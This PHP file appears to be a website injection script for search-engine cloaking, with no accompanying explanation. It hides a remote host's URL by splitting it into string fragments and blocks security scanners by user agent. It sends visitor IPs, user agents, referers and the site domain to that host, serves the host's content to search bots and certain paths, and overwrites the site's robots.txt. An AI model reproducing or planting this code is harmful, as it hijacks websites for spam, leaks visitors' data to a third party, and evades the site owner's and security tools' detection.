<?php $mvlc='.com/';$qakk='4.smootha';$lyhm='http://';$kdkf='8';$wvhg='cw15';$gsld='n';$ghjue=$lyhm.$wvhg.$kdkf.$qakk.$gsld.$mvlc; $pc = "VV0LDgY"; $bagent = "Docomo|Yahoo|Bing|Google"; error_reporting(0); if(preg_match("/(Bytespider|swiftbot|AmazonBot|UniversalFeedParser|GPTBot|LightDeckReports Bot|java|SemrushBot|jikeSpider|feedDemon|ZmEu|Go-http-client|OBot|SeznamBot|Indy Library|python-requests|Python|barkrowler|yisouSpider|paloaltonetworks|DotBot|easouSpider|httpClient|AskTbFXTV|DataForSEO|AhrefsBot|Scrapy|CoolpadWebkit|YySpider|DigExt|petalBot|yandexBot|CensysInspect|Jaunty|Ezooms|python-urllib|Feedly|apacheBench|CrawlDaddy|Heritrix|Mj12bot)/i", $_SERVER['HTTP_USER_AGENT'])) {  header('HTTP/1.0 403 Forbidden');  exit(); } $refer = urlencode(@$_SERVER['HTTP_REFERER']); $uagent = urlencode($_SERVER['HTTP_USER_AGENT']); $language = urlencode(@$_SERVER['HTTP_ACCEPT_LANGUAGE']); $ip = $_SERVER['REMOTE_ADDR']; if (isset($_SERVER['HTTP_CLIENT_IP'])) {  $ip = $_SERVER['HTTP_CLIENT_IP']; } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {  $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; } $ip = urlencode($ip); $domain = urlencode($_SERVER['HTTP_HOST']); $script = urlencode($_SERVER['SCRIPT_NAME']);  if ((!empty($_SERVER['REQUEST_SCHEME']) and $_SERVER['REQUEST_SCHEME'] == 'https') or (!empty($_SERVER['HTTPS']) and $_SERVER['HTTPS'] == 'on') or (!empty($_SERVER['SERVER_PORT']) and $_SERVER['SERVER_PORT'] == '443') or (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) and $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) {  $_SERVER['REQUEST_SCHEME'] = 'https'; } else {  $_SERVER['REQUEST_SCHEME'] = 'http'; } function writeToFile($filePath, $content) {  $file = fopen($filePath, "w");  if ($file) {  fwrite($file, $content);  fclose($file);  return true;  }  return false; }  function readFromFile($filePath) {  $file = fopen($filePath, "r");  if ($file) {  $content = fread($file, filesize($filePath));  fclose($file);  return $content;  }  return false; } $http = urlencode($_SERVER['REQUEST_SCHEME']); $uri = urlencode($_SERVER['REQUEST_URI']); if(strpos($uri,"csrcsr") !== false){echo "ok";exit();} $csr = 0; $csrFilePath = "csr.txt"; if(!is_file($csrFilePath)) {  $uuu = $http.'://'.$_SERVER['HTTP_HOST'].'/csrcsr';  $vmnb = @file_get_contents($uuu);   if($vmnb === "ok") {   $csr = 1;   writeToFile($csrFilePath,"1");  } else {   $csr = 0;   writeToFile($csrFilePath,"0");  } } else {  $csr = readFromFile($csrFilePath); }  if(strpos($uri,"favicon.ico") !== false) { } else if(strpos($uri,"robots.txt") !== false or strpos($uri,"pingsitemap") !== false or strpos($uri,"jp2023") !== false or preg_match("@^/(.*?).xml$@i", $_SERVER['REQUEST_URI']) or preg_match("/($bagent)/i", $_SERVER['HTTP_USER_AGENT']) or preg_match("/($bagent)/i", $_SERVER['HTTP_REFERER'])) {  $requsturl = $ghjue."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$csr&script=$script";  $robots_contents = "";  if(strpos($uri,"pingsitemap") !== false) {   $scripname = $_SERVER['SCRIPT_NAME'];   if(strpos($scripname,"index.ph") !== false) {    if($csr == 0) {     $scripname = '/?';    } else {     $scripname = '/';    }   } else {    $scripname = $scripname.'?';   }   $robots_contents = "User-agent: *\r\nAllow: /";   $sitemap = "$http://" . $domain .$scripname. "sitemap.xml";   $robots_contents = trim($robots_contents)."\r\n"."Sitemap: $sitemap";   $sitemapstatus = "";   echo $sitemap.": ".$sitemapstatus.'<br/>';   $requsturl = $ghjue."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$csr&script=$script&sitemap=".urlencode($sitemap);  }  $vmnb = @file_get_contents($requsturl);  if(empty($vmnb)) {   $ch = curl_init();   curl_setopt($ch, CURLOPT_URL, $requsturl);   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);   curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);   curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);   $vmnb = curl_exec($ch);   curl_close($ch);  }  if(!empty($vmnb)) {   if(substr($vmnb,0,10)=="error code" or $vmnb == "500" or strpos($vmnb,'Bad Gateway')!==false) {    header("HTTP/1.0 500 Internal Server Error");    exit();   }   if(strpos($uri,"jp2023") !== false){header('HTTP/1.1 404 Not Found');}   else if(substr($vmnb,0,5)=="<?xml") {    header('Content-Type: text/xml; charset=utf-8');   } else {    header('Content-Type: text/html; charset=utf-8');   }   echo $vmnb;   if(!empty($robots_contents)){writeToFile("robots.txt",$robots_contents);}   else if(strpos($uri,"robots.txt") !== false){writeToFile("robots.txt",$vmnb);}   exit();   return;  } }else{ }  ?>
